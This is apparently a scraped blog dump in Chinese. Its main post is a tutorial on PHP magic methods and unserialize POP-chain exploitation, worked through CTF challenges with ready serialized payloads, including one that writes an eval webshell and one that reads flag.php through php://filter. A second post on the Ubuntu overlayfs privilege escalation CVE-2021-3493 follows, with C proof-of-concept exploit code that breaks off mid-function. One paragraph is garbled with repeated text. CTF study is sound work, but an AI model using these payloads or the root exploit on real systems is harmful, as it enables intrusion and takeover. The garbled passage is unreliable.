__set()：设置对象不存在的属性或无法访问(私有)的属性时调用 /* __set($name, $value) * 用来为私有成员属性设置的值 * 第一个参数为你要为设置值的属性名，第二个参数是要给属性设置的值，没有返回值。 */ public function __set($name,$value)&#123; echo &#x27;__set 不存在成员变量 &#x27;.$name.&#x27;&lt;br&gt;&#x27;; echo &#x27;即将设置的值 &#x27;.$value.&quot;&lt;br&gt;&quot;; $this-&gt;noway=$value; &#125; public function Get()&#123; echo $this-&gt;noway; &#125;&#125;$a = new Test();// 读取 noway 的值，初始为0$a-&gt;Get();echo &#x27;&lt;br&gt;&#x27;;// 无法访问(私有)noway属性时调用，并设置值为899$a-&gt;noway = 899;// 经过__set方法的设置noway的值为899$a-&gt;Get();echo &#x27;&lt;br&gt;&#x27;;// 设置对象不存在的属性spaceman$a-&gt;spaceman = 566;// 经过__set方法的设置noway的值为566$a-&gt;Get();?&gt; 运行结果： 12345670__set 不存在成员变量 noway即将设置的值 899899__set 不存在成员变量 spaceman即将设置的值 566566 # __get 与 __set 例： 1234567891011121314151617181920212223242526272829303132333435&lt;?phpclass Person&#123; private $name; private $sex; private $age; //__get()方法用来获取私有属性 public function __get($property_name)&#123; echo &quot;在直接获取私有属性值的时候，自动调用了这个__get()方法&lt;br&gt;&quot;; if(isset($this-&gt;$property_name)) &#123; return($this-&gt;$property_name); &#125; else &#123; return(NULL); &#125; &#125; // __set()方法用来设置私有属性 public function __set($property_name, $value)&#123; echo &quot;在直接设置私有属性值的时候，自动调用了这个__set()方法为私有属性赋值&lt;br&gt;&quot;; $this-&gt;$property_name = $value; &#125;&#125;$a = new Person();// 直接为私有属性赋值的操作，会自动调用__set()方法进行赋值$a-&gt;name=&quot;张三&quot;;$a-&gt;sex=&quot;男&quot;;$a-&gt;age=20;// 直接获取私有属性的值，会自动调用__get()方法，返回成员属性的值echo &quot;姓名：&quot;.$a-&gt;name.&quot;&lt;br&gt;&quot;;echo &quot;性别：&quot;.$a-&gt;sex.&quot;&lt;br&gt;&quot;;echo &quot;年龄：&quot;.$a-&gt;age.&quot;&lt;br&gt;&quot;;?&gt; 运行结果： 123456789在直接设置私有属性值的时候，自动调用了这个__set()方法为私有属性赋值在直接设置私有属性值的时候，自动调用了这个__set()方法为私有属性赋值在直接设置私有属性值的时候，自动调用了这个__set()方法为私有属性赋值在直接获取私有属性值的时候，自动调用了这个__get()方法姓名：张三在直接获取私有属性值的时候，自动调用了这个__get()方法性别：男在直接获取私有属性值的时候，自动调用了这个__get()方法年龄：20 # __toString() __toString() ：在对象当做字符串的时候会被调用。 例： 123456789101112131415161718192021&lt;?phpclass Test&#123; public $variable = &#x27;This is a string&#x27;; public function good()&#123; echo $this-&gt;variable . &#x27;&lt;br /&gt;&#x27;; &#125; // 在对象当做字符串的时候会被调用 public function __toString() &#123; return &#x27;__toString &lt;br&gt;&#x27;; &#125;&#125;$a = new Test();$a-&gt;good();echo $a;?&gt; 运行结果： 12This is a string__toString # __sleep() __sleep() ： serialize 之前被调用，可以指定要序列化的对象属性。 例： 1234567891011121314151617181920212223242526&lt;?phpclass Test&#123; public $name; public $age; public $string; // __construct：实例化对象时被调用.其作用是拿来初始化一些值。 public function __construct($name, $age, $string)&#123; echo &quot;__construct 初始化&quot;.&quot;&lt;br&gt;&quot;; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;string = $string; &#125; // __sleep() ： serialize之前被调用，可以指定要序列化的对象属性 public function __sleep()&#123; echo &quot;当在类外部使用serialize()时会调用这里的__sleep()方法&lt;br&gt;&quot;; // 例如指定只需要 name 和 age 进行序列化，必须返回一个数值 return array(&#x27;name&#x27;, &#x27;age&#x27;); &#125;&#125;$a = new Test(&quot;Spaceman&quot;,566, &#x27;Test String&#x27;);echo serialize($a);?&gt; 运行结果： 123__construct 初始化当在类外部使用serialize()时会调用这里的__sleep()方法O:4:&quot;Test&quot;:2:&#123;s:4:&quot;name&quot;;s:8:&quot;Spaceman&quot;;s:3:&quot;age&quot;;i:566;&#125; # __wakeup __wakeup ：反序列化恢复对象之前调用该方法 例： 123456789101112131415161718192021222324&lt;?phpclass Test&#123; public $sex; public $name; public $age; public function __construct($name, $age, $sex)&#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; &#125; public function __wakeup()&#123; echo &quot;当在类外部使用unserialize()时会调用这里的__wakeup()方法&lt;br&gt;&quot;; $this-&gt;age = 566; &#125;&#125;$person = new Test(&#x27;spaceman&#x27;,21,&#x27;男&#x27;);$a = serialize($person);echo $a.&quot;&lt;br&gt;&quot;;var_dump (unserialize($a));?&gt; 运行结果： 12345678910O:4:&quot;Test&quot;:3:&#123;s:3:&quot;sex&quot;;s:3:&quot;男&quot;;s:4:&quot;name&quot;;s:8:&quot;spaceman&quot;;s:3:&quot;age&quot;;i:21;&#125;当在类外部使用unserialize()时会调用这里的__wakeup()方法class Test#2 (3) &#123; public $sex =&gt; string(3) &quot;男&quot; public $name =&gt; string(8) &quot;spaceman&quot; public $age =&gt; int(566)&#125; # __isset() __isset() : 检测对象的某个属性是否存在时执行此函数。 当对不可访问属性调用 isset () 或 empty () 时，__isset () 会被调用。 例： 1234567891011121314151617181920212223242526&lt;?phpclass Person&#123; public $sex; private $name; private $age; public function __construct($name, $age, $sex)&#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; &#125; // __isset()：当对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。 public function __isset($content)&#123; echo &quot;当在类外部使用isset()函数测定私有成员 &#123;$content&#125; 时，自动调用&lt;br&gt;&quot;; return isset($this-&gt;$content); &#125;&#125;$person = new Person(&quot;spaceman&quot;, 25,&#x27;男&#x27;);// public 成员echo ($person-&gt;sex),&quot;&lt;br&gt;&quot;;// private 成员echo isset($person-&gt;name);?&gt; 运行结果： 123男当在类外部使用isset()函数测定私有成员 name 时，自动调用1 # __unset() __unset() ：在不可访问的属性上使用 unset () 时触发 销毁对象的某个属性时执行此函数。 1、 如果一个对象里面的成员属性是公有的，就可以使用这个函数在对象外面删除对象的公有属性。 2、 如果对象的成员属性是私有的，我使用这个函数就没有权限去删除。 例： 1234567891011121314151617181920212223242526&lt;?phpclass Person&#123; public $sex; private $name; private $age; public function __construct($name, $age, $sex)&#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; &#125; // __unset()：销毁对象的某个属性时执行此函数 public function __unset($content) &#123; echo &quot;当在类外部使用unset()函数来删除私有成员时自动调用的&lt;br&gt;&quot;; echo isset($this-&gt;$content).&quot;&lt;br&gt;&quot;; &#125;&#125;$person = new Person(&quot;spaceman&quot;, 21,&quot;男&quot;); // 初始赋值unset($person-&gt;sex);echo &quot;666666&lt;br&gt;&quot;;unset($person-&gt;name);unset($person-&gt;age);?&gt; 运行结果： 12345666666当在类外部使用unset()函数来删除私有成员时自动调用的1当在类外部使用unset()函数来删除私有成员时自动调用的1 # __invoke() __invoke() ：将对象当作函数来使用时执行此方法，通常不推荐这样做。 例： 1234567891011121314&lt;?phpclass Test&#123; // _invoke()：以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用 public function __invoke($param1, $param2, $param3) &#123; echo &quot;这是一个对象&lt;br&gt;&quot;; var_dump($param1,$param2,$param3); &#125;&#125;$a = new Test();$a(&#x27;spaceman&#x27;,21,&#x27;男&#x27;);?&gt; 运行结果： 1234这是一个对象string(8) &quot;spaceman&quot;int(21)string(3) &quot;男&quot; # 举例 # pop 链的利用 # 例 1： 123456789101112131415161718192021222324252627282930313233&lt;?phphighlight_file(__FILE__);class pop &#123; public $ClassObj; // 对象实例化时调用 function __construct() &#123; $this-&gt;ClassObj = new hello(); &#125; // 对象销毁或程序运行结束时调用 function __destruct() &#123; $this-&gt;ClassObj-&gt;action(); &#125;&#125;class hello &#123; function action() &#123; echo &quot;&lt;br&gt; hello pop &quot;; &#125;&#125;class shell &#123; public $data; function action() &#123; eval($this-&gt;data); &#125;&#125;$a = new pop();unserialize($_GET[&#x27;s&#x27;]); 简单的审计一下，可以发现，pop 类本来是调用 hello 类的，然后程序结束执行 action 方法，但是 shell 类也有 action 方法，所以就可以构造 pop 链，使其 pop 类调用 shell 类从而执行 eval 函数。 构造如下： 1234567891011121314151617181920&lt;?phphighlight_file(__FILE__);class pop &#123; public $ClassObj; function __construct() &#123; $this-&gt;ClassObj = new shell(); &#125;&#125;class shell &#123; public $data = &quot;phpinfo();&quot;; function action() &#123; eval($this-&gt;data); &#125;&#125;echo serialize(new pop()); 运行结果： 1O:3:&quot;pop&quot;:1:&#123;s:8:&quot;ClassObj&quot;;O:5:&quot;shell&quot;:1:&#123;s:4:&quot;data&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125; 不过需要注意的是 private 属性和 protected 属性 12345678910111213141516171819&lt;?phphighlight_file(__FILE__);class pop &#123; public $Pub = &quot;spaceman&quot;; private $Pri = &quot;good&quot;; protected $ClassObj; function __construct() &#123; $this-&gt;ClassObj = new hello(); &#125;&#125;class hello &#123;&#125;echo urlencode(serialize(new pop())); 运行结果如下， 有 %00 存在是因为 private 属性和 protected 属性 1O%3A3%3A%22pop%22%3A3%3A%7Bs%3A3%3A%22Pub%22%3Bs%3A8%3A%22spaceman%22%3Bs%3A8%3A%22%00pop%00Pri%22%3Bs%3A4%3A%22good%22%3Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A5%3A%22hello%22%3A0%3A%7B%7D%7D # 例 2： [MRCTF2020]Ezpop 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phpclass Modifier &#123; protected $var; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file=&#x27;index.php&#x27;)&#123; $this-&gt;source = $file; echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = array(); &#125; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123; @unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123; $a=new Show; highlight_file(__FILE__);&#125; 首先看看所涉及到的魔术方法： 12345__construct() 当一个对象创建时被调用__toString() 当一个对象被当作一个字符串使用__wakeup() 将在反序列化之后立即被调用__get() 访问不存在的成员变量时调用的__invoke() 将对象当作函数来使用时执行此方法 我们可以先一个一个类看看怎么利用 Modifier 类： 12345678910111213141516171819&lt;?phphighlight_file(__FILE__);class Modifier &#123; protected $var = &#x27;info.php&#x27;; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; echo &#x27;__invoke&#x27;.&quot;&lt;br&gt;&quot;; $this-&gt;append($this-&gt;var); &#125;&#125;$a = new Modifier();$a(); 这里假设需要 include 的文件是 info.php 简单解释一下代码的意思，就是我们需要执行 append 方法，若需要执行该方法可通过 __invoke 方法执行，也就是当将对象当作函数来使用时执行 __invoke 方法 所以我们就可以先创建这个对象然后再拿来当函数使用，就会自动触发 __invoke 方法，从而就可以执行 append 方法包含 info.php 文件 运行结果： 接下来是 Test 类： 1234567891011class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = array(); &#125; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125; 首先是 __construct 方法初始化设置 p 是一个数组，这显然不是我们需要的，但我们可以重新初始化，然后是 __get 方法，访问不存在的成员变量时调用，而且返回的是方法，这不就可以配合第一个 Modifier 类使用了吗，使用 Test 类的 __get 方法调用 Modifier 类，所以我们可以使 Test 类初始化将 $p 的值设为 Modifier 对象，然后再经过 __get 方法以函数的方式执行 Modifier 对象（即访问一个 Test 类不存在的属性），这样就可以使用 Modifier 对象的 append 方法了，如下： 12345678910111213141516171819202122232425262728293031&lt;?phpclass Modifier &#123; protected $var = &#x27;info.php&#x27;; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; echo &#x27;__invoke&#x27;.&quot;&lt;br&gt;&quot;; $this-&gt;append($this-&gt;var); &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = new Modifier(); &#125; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125;$a = new Test();$a-&gt;no;?&gt; 运行结果： 最后是这个 Show 类 123456789101112131415161718class Show&#123; public $source; public $str; public function __construct($file=&#x27;index.php&#x27;)&#123; $this-&gt;source = $file; echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125; 首先使用 unserialize 会先触发 __wakeup 方法，这个方法在这里其实就是充当过滤字符，接着是初始化方法，这个方法有个关键的地方就是使用了 echo 打印字符串，并且将 source 拼接起来打印，而 __toString() 就是当一个对象被当作一个字符串时调用，正好可以利用初始化方法的 echo 去完成调用。 分析了这么多，最后就可以构造最终的 pop 链了，先上 payload 再继续讲 1234567891011121314151617181920212223242526272829&lt;?phpclass Modifier &#123; protected $var = &#x27;info.php&#x27;;&#125;class Show&#123; public $source; public $str; public function __construct($file)&#123; $this-&gt;source = $file; echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return &quot;566&quot;; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = new Modifier(); &#125;&#125;$a = new Show(&#x27;spaceman&#x27;);$a-&gt;str = new Test();$c = new Show($a);echo serialize($c); 运行结果有不可显示字符 %00 这里我手动加上了，所以可以使用 urlencode 一下，我这里是为了更直观的查看所以直接序列化 123Welcome to spacemanWelcome to 566O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;s:8:&quot;spaceman&quot;;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot;%00*%00var&quot;;s:8:&quot;info.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;N;&#125; $a = new Show('spaceman'); 首先是 new 一个 Show 对象，然后初始化 source 的值，如 spaceman 等字符，这个没多大影响，只是为了调用 Test 类中的 __get 方法，那如何调用的呢 $a-&gt;str = new Test(); 将 Show 类的 str 属性设为 new Test () $c = new Show($a); 然后再用 Show 类初始化刚刚构造的 Show 类，这里可能就有点绕了，为何我们需要这样构造呢，因为我们需要触发 Show 的 __toString() 方法，让 str 能调用 source，而经过刚刚的赋值，str 为 new Test() ，source 为 new Show('spaceman') 中的 spaceman ，那么 __toString 方法中的 str-&gt;source 就是访问 Test 类中的 spaceman 属性，然而 Test 类没有 spaceman 属性，那么就会触发 __get 方法，而该方法又会触发 Modifier 类中的 __invoke 方法，最后就完成了 include 所以大概调用的过程是： 1Show::__toString()--&gt;Test::__get()--&gt;Modifier::__invoke() 执行结果： 当然这是文件包含，那么想要读取文件应该怎么办呢，可以 php 伪协议使用，所以可以这样构造读取文件 12345678910111213141516171819202122232425262728293031&lt;?phpclass Modifier &#123; protected $var = &#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;;&#125;class Show&#123; public $source; public $str; public function __construct($file)&#123; $this-&gt;source = $file; echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return &quot;566&quot;; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = new Modifier(); &#125;&#125;$a = new Show(&#x27;spaceman&#x27;);$a-&gt;str = new Test();$c = new Show($a);echo serialize($c);//O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;s:8:&quot;spaceman&quot;;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot;%00*%00var&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;N;&#125; 运行结果 执行： 最后 base64 解码即可 # 例 3： ctfshow 反序列化 web261 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phphighlight_file(__FILE__);class ctfshowvip&#123; public $username; public $password; public $code; public function __construct($u,$p)&#123; $this-&gt;username=$u; $this-&gt;password=$p; &#125; public function __wakeup()&#123; if($this-&gt;username!=&#x27;&#x27; || $this-&gt;password!=&#x27;&#x27;)&#123; die(&#x27;error&#x27;); &#125; &#125; public function __invoke()&#123; eval($this-&gt;code); &#125; public function __sleep()&#123; $this-&gt;username=&#x27;&#x27;; $this-&gt;password=&#x27;&#x27;; &#125; public function __unserialize($data)&#123; $this-&gt;username=$data[&#x27;username&#x27;]; $this-&gt;password=$data[&#x27;password&#x27;]; $this-&gt;code = $this-&gt;username.$this-&gt;password; &#125; public function __destruct()&#123; if($this-&gt;code==0x36d)&#123; file_put_contents($this-&gt;username, $this-&gt;password); &#125; &#125;&#125;unserialize($_GET[&#x27;vip&#x27;]); 首先呢了解一个上文没讲过的 __unserialize() 方法， 反序列化函数，用于序列化的 SET 类型数据。如果参数不是序列化的 SET，那么会直接返回。如果是一个序列化的 SET，但不是 PHP-REDIS 序列化的格式，函数将抛出一个异常。 Examples： 12$redis-&gt;setOpt(Redis::OPT_SERIALIZER, Redis::SERIALIZER_PHP);$redis-&gt;_unserialize(&#x27;a:3:&#123;i:0;i:1;i:1;i:2;i:2;i:3;&#125;&#x27;); // Will return Array(1,2,3) 所以我们此时应该先想怎么序列化 __sleep() serialize 之前被调用，可以指定要序列化的对象属性。 所以在反序列化的时候就没啥用了，我们自己序列化的时候也不加，而 __unserialize 在序列化的时候也用不到， __wakeup 是反序列化恢复对象之前调用的方法，所以跟序列化也没啥关系， __invoke() 是将对象当作函数来使用时执行此方法，但是我发现并不需要调用此方法，因为 __destruct() 方法中有 file_put_contents 函数可以写文件，所以我们需要满足 code==0x36d 即可将文件写入，这里不难发现是弱类型比较，所以 887.php==0x36d 是成立的，所以我们可以直接构造如下： 123456789101112&lt;?phpclass ctfshowvip&#123; public $username; public $password; public function __construct($u,$p)&#123; $this-&gt;username=$u; $this-&gt;password=$p; &#125;&#125;$a = new ctfshowvip(&#x27;877.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);echo serialize($a); 为什么可以直接这样构造而不被 __wakeup() 拦截呢，因为含有 __unserialize（） ，就是当一个类中同时含有这两个方法时只有 __unserialize 生效，而 __wakeup() 失效，如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354 &lt;?phphighlight_file(__FILE__);class ctfshowvip&#123; public $username; public $password; public $code; public function __construct($u,$p)&#123; echo &quot;__construct()&lt;br&gt;&quot;; $this-&gt;username=$u; $this-&gt;password=$p; &#125; public function __wakeup()&#123; echo &quot;__wakeup()&lt;br&gt;&quot;; if($this-&gt;username!=&#x27;&#x27; || $this-&gt;password!=&#x27;&#x27;)&#123; die(&#x27;error&#x27;); &#125; &#125; public function __invoke()&#123; echo &quot;__invoke()&lt;br&gt;&quot;; eval($this-&gt;code); &#125; public function __sleep()&#123; echo &quot;__sleep()&lt;br&gt;&quot;; $this-&gt;username=&#x27;&#x27;; $this-&gt;password=&#x27;&#x27;; &#125; public function __unserialize($data)&#123; echo &quot;__unserialize()&lt;br&gt;&quot;; $this-&gt;username=$data[&#x27;username&#x27;]; $this-&gt;password=$data[&#x27;password&#x27;]; $this-&gt;code = $this-&gt;username.$this-&gt;password; var_dump($data); echo &quot;&lt;br&gt;&quot;; echo $this-&gt;code; echo &quot;&lt;br&gt;&quot;; &#125; public function __destruct()&#123; echo &quot;__destruct()&lt;br&gt;&quot;; if($this-&gt;code==0x36d)&#123; echo &quot;file_put_contents-----good!&lt;br&gt;&quot;; &#125; &#125;&#125;unserialize($_GET[&#x27;vip&#x27;]); 运行结果： 12345__unserialize()array(2) &#123; [&quot;username&quot;]=&gt; string(7) &quot;877.php&quot; [&quot;password&quot;]=&gt; string(24) &quot;&lt;?php eval($_POST[1]);?&gt;&quot; &#125;877.php__destruct()file_put_contents-----good! 成功写入木马，剩下的操作就不说了 # 例 4： 2021 蓝帽杯半决赛 - 杰克与肉丝 源码： 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phphighlight_file(__file__); class Jack &#123; private $action; function __set($a, $b) &#123; $b-&gt;$a(); &#125;&#125;class Love &#123; public $var; function __call($a,$b) &#123; $rose = $this-&gt;var; call_user_func($rose); &#125; private function action()&#123; echo &quot;jack love rose&quot;; &#125;&#125;class Titanic&#123; public $people; public $ship; function __destruct()&#123; $this-&gt;people-&gt;action=$this-&gt;ship; &#125;&#125;class Rose&#123; public $var1; public $var2; function __invoke()&#123; //if( ($this-&gt;var1 != $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) === md5($this-&gt;var2)) &amp;&amp; (sha1($this-&gt;var1)=== sha1($this-&gt;var2)) )&#123; eval($this-&gt;var1); //&#125; &#125;&#125;if(isset($_GET[&#x27;love&#x27;]))&#123; $sail=$_GET[&#x27;love&#x27;]; unserialize($sail);&#125;?&gt; 为了不受其他因素干扰，我先把这个 Rose 类__invoke 函数的 if 语句注释，就是为了更方便的看看怎么构造的，所以首先我们应该直接寻找我们最后利用的函数 eval，然后利用逆推的方式，看看是如何触发该函数的，就是看看怎么调用的，invoke () 将对象当作函数来使用时执行此方法，所以刚刚开始我们依旧可以慢慢一步一步测试分析，慢慢一步一步调用 12345678910111213&lt;?phpclass Rose&#123; public $var1 = &quot;phpinfo();&quot;; public $var2; function __invoke()&#123; eval($this-&gt;var1); &#125;&#125;$a = new Rose();echo $a-&gt;var1;$a(); 现在是构造出来了，接着是看看怎么才能调用这个类，而 Love 类有一个是函数以函数的方式，call_user_func 是把第一个参数作为回调函数调用，正好符合了我们需要构造的，所以我们又看一下这个函数是怎么触发的，__call 当调用对象中不存在的方法会自动调用该方法，由于 call_user_func 回调的参数是rose，rose，rose，rose 又是直接等于var，所以我们需要先给var，所以我们需要先给var，所以我们需要先给 var 赋值，这个值就是 Rose 类，这样 call_user_func 回调时就拿 Rose 类当函数执行，这样就可以出发 Rose 类的 eval 了 12345678910111213141516171819202122232425262728&lt;?phpclass Love&#123; public $var; function __call($a,$b) &#123; $rose = $this-&gt;var; echo &quot;$a function not find!&lt;br&gt;&quot;; call_user_func($rose); &#125; private function action()&#123; echo &quot;jack love rose&quot;; &#125;&#125;class Rose&#123; public $var1 = &quot;phpinfo();&quot;; public $var2; function __invoke()&#123; echo $this-&gt;var1; eval($this-&gt;var1); &#125;&#125;$a = new Rose();$b = new Love();$b-&gt;var = $a;$b-&gt;spaceman(566); //不存在的spaceman函数 然后我们继续寻找一下如何在别的类里找一个不存在的函数，b−&gt;spaceman(566)这样的形式Jack类就有，正好又可以构造了，然后我们再看一下怎么触发Jack类中的这个形式，_set设置对象不存在的属性或无法访问(私有)的属性时调用，这里的b-&gt;spaceman(566) 这样的形式Jack类就有，正好又可以构造了，然后我们再看一下怎么触发Jack类中的这个形式，_\\_set 设置对象不存在的属性或无法访问(私有)的属性时调用，这里的b−&gt;spaceman(566)这样的形式Jack类就有，正好又可以构造了，然后我们再看一下怎么触发Jack类中的这个形式，_​set设置对象不存在的属性或无法访问(私有)的属性时调用，这里的 action 是私有的，所以我们可以利用这个 action 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpclass Jack&#123; private $action; function __set($a, $b) &#123; echo &quot;good! I run!&lt;br&gt;&quot;; $b-&gt;$a(); &#125;&#125;class Love&#123; public $var; function __call($a,$b) &#123; $rose = $this-&gt;var; echo &quot;$a function not find!&lt;br&gt;&quot;; call_user_func($rose); &#125; private function action()&#123; echo &quot;jack love rose&quot;; &#125;&#125;class Rose&#123; public $var1 = &quot;phpinfo();&quot;; public $var2; function __invoke()&#123; echo $this-&gt;var1; eval($this-&gt;var1); &#125;&#125;$a = new Rose();$b = new Love();$b-&gt;var = $a;$c = new Jack();$c-&gt;action = $b; 其实这里不用 action 其实也是可以的，随便一个名字都行，但是这里用 action 是因为等下需要，因为我们需要利用这个 action，那么就是接下来怎么触发这个 Jack 类了，源码中只有一个 unserialize，而要想触发这一系列的类，只有 Titanic 类符合开始的条件，因为只有 Titanic 类的__destruct 魔法函数触发，所以这就是我们序列化的入口，__destruct 当对象所在函数调用完毕后执行。最后就是用 Titanic 类将这些类都连接在一起 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpclass Titanic&#123; public $people; public $ship; function __destruct()&#123; $this-&gt;people-&gt;action=$this-&gt;ship; &#125;&#125;class Jack&#123; private $action; function __set($a, $b) &#123; echo &quot;good! I run!&lt;br&gt;&quot;; $b-&gt;$a(); &#125;&#125;class Love&#123; public $var; function __call($a,$b) &#123; $rose = $this-&gt;var; echo &quot;$a function not find!&lt;br&gt;&quot;; call_user_func($rose); &#125; private function action()&#123; echo &quot;jack love rose&quot;; &#125;&#125;class Rose&#123; public $var1 = &quot;phpinfo();&quot;; public $var2; function __invoke()&#123; echo $this-&gt;var1; eval($this-&gt;var1); &#125;&#125;$s = new Titanic();$s-&gt;people = new Jack();$s-&gt;ship = new Love();$s-&gt;ship-&gt;var = new Rose();echo urlencode(serialize($s));echo &quot;&lt;br&gt;&quot;; 最后将序列化后得到的数据输入源码中即可 注释掉那个 md5 与 sha1 绕过我就不讲了，如果有师傅感兴趣可以参考 https://blog.csdn.net/LYJ20010728/article/details/114493052 # 结束语 哈哈哈，下次一定好好更新，下次一定 本次主要是讲了 php 反序列中常用魔术方法怎么触发以及怎么构造 pop 链，在实战中有的漏洞就是通过源码审计反序列化来导致 RCE 的，比如 thinkphp5.1.* 就存在一个 RCE 的 pop 链，这个我之后也会进行更新，构造 pop 链就是需要耐心也细心，一开始都不容易，我个人使用的是逆推的方法，就是从最后的命令执行往前推，需要啥就找啥，有的师傅是习惯从头到尾，我比较菜，只能从后面慢慢测试慢慢往前推，最后感谢关注我的朋友们，我会更加努力学习，尽量帮师傅们更快掌握一些知识，以后会尽量更新文章，谢谢师傅们！","path":"2021/06/30/PHP-反序列化（超细的）/","date":"06-30","excerpt":"","tags":[{"name":"PHP","slug":"PHP","permalink":"https://spaceman-911.gitee.io/tags/PHP/"}]},{"title":"CVE-2021-3493 Ubuntu提权","text":"# CVE-2021-3493 Ubuntu 提权 # CVE-2021-3493 Ubutnu 一些版本存在本地用户提权至 root 权限。漏洞是 Linux 内核中 overlayfs 文件系统中的 Ubuntu 特定问题，在该问题中，它未正确验证关于用户名称空间的文件系统功能的应用程序。由于 Ubuntu 附带了一个允许非特权的 overlayfs 挂载的补丁，因此本地攻击者可以使用它来获得更高的特权。 # 影响版本 Ubuntu 20.10 Ubuntu 20.04 LTS Ubuntu 18.04 LTS Ubuntu 16.04 LTS Ubuntu 14.04 ESM # 漏洞复现 测试环境： Ubuntu 16.04 LTS gcc 环境 poc 文件内容 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;err.h&gt;#include &lt;errno.h&gt;#include &lt;sched.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/mount.h&gt;//#include &lt;attr/xattr.h&gt;//#include &lt;sys/xattr.h&gt;int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);#define DIR_BASE &quot;./ovlcap&quot;#define DIR_WORK DIR_BASE &quot;/work&quot;#define DIR_LOWER DIR_BASE &quot;/lower&quot;#define DIR_UPPER DIR_BASE &quot;/upper&quot;#define DIR_MERGE DIR_BASE &quot;/merge&quot;#define BIN_MERGE DIR_MERGE &quot;/magic&quot;#define BIN_UPPER DIR_UPPER &quot;/magic&quot;static void xmkdir(const char *path, mode_t mode)&#123; if (mkdir(path, mode) == -1 &amp;&amp; errno != EEXIST) err(1, &quot;mkdir %s&quot;, path);&#125;static void xwritefile(const char *path, const char *data)&#123; int fd = open(path, O_WRONLY); if (fd == -1) err(1, &quot;open %s&quot;, path); ssize_t len = (ssize_t) strlen(data); if (write(fd, data, len) != len) err(1, &quot;write %s&quot;, path); close(fd);&#125;static void xcopyfile(const char *src, const char *dst, mode_t mode)&#123; int fi, fo; if ((fi = open(src, O_RDONLY)) == -1) err(1, &quot;open %s&quot;, src); if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1) err(1, &quot;open %s&quot;, dst); char buf[4096]; ssize_t rd, wr; for (;;) &#123; rd = read(fi, buf, sizeof(buf)); if (rd == 0) &#123; break; &#125; else if (rd == -1) &#123; if (errno == EINTR) continue; err(1, &quot;read %s&quot;, src); &#125; char *p = buf; while (rd &gt; 0) &#123; wr = write(fo, p, rd); if (wr == -1) &#123; if (errno == EINTR) continue; err(1, &quot;write %s&quot;, dst); &#125; p += wr; rd -= wr; &#125; &#125; close(fi); close(fo);&#125;static int exploit()&#123; char buf[4096]; sprintf(buf, &quot;rm -rf &#x27;%s/&#x27;&quot;, 